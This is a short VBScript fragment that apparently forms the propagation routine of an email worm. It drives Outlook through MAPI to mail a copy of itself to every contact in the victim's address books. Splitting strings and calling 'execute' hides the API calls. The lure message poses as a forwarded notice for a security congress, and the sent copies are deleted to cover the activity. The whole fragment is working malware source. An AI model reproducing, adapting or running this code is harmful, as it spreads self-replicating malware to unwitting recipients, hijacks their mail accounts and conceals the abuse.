   egallaecia1="Outlook"

   egallaecia2=".Application"

   egallaecia3=egallaecia1+egallaecia2

   Set ClienteCorreo = CreateObject(egallaecia3)

   If ClienteCorreo = egallaecia1 Then

     egallaecia4="MAPI"

     Set CorreoUsuario = ClienteCorreo.GetNameSpace(egallaecia4)

     Set AgendaUsuario = CorreoUsuario.AddressLists

     For Each Grupo In AgendaUsuario

       For Contacto = 1 to Grupo.AddressEntries.Count

         If Grupo.AddressEntries.Count <> 0 Then

           egallaecia5="Set Mensaje = ClienteCorreo."
           egallaecia6="Create"
           egallaecia7="Item(0)"
           execute egallaecia5+egallaecia6+egallaecia7

           Set Direccion = Grupo.AddressEntries(Contacto)

           Mensaje.To = Direccion.Address

           Mensaje.Subject = "RV: Congreso de seguridad eGallaecia'02 (http://www.e-gallaecia.com)"

           Mensaje.Body = "He recibido esta info, creo que te va a interesar."

           execute "Set Adjunto = Mensaje.Attachments"

           Adjunto.Add wscript.scriptfullname

           Mensaje.DeleteAfterSubmit = True

           If Mensaje.To <> "" Then Mensaje.Send

         End If

       Next

     Next

   End If
